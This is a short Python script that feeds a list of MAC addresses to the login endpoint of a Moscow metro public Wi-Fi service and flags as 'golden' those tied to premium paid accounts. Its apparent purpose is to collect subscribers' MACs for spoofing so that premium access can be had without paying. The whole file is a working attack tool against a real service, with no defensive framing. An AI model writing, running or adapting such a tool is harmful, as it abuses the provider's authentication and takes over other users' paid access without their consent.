# -*- coding: utf-8 -*-
import requests

macs = open('parsed_macs.txt','r')
golden = []
for mac in macs:
    mac = mac.lower().replace(':','-').strip()
    page = requests.get('https://login.wi-fi.ru/am/UI/Login?org=mac&service=coa&client_mac='+mac+'&ForceAuth=true')
    if u'Введите Ваш номер и подтвердите идентификацию' in page.text:
        print (mac+' not authorized')
    if "mosmetro_premium" in page.text:
        print (mac+' is golden!')
        golden.append(mac)
    else:
        print (mac+' is not payed')

print '======Golden macs=========='
for mac in golden:
    print mac

macs.close()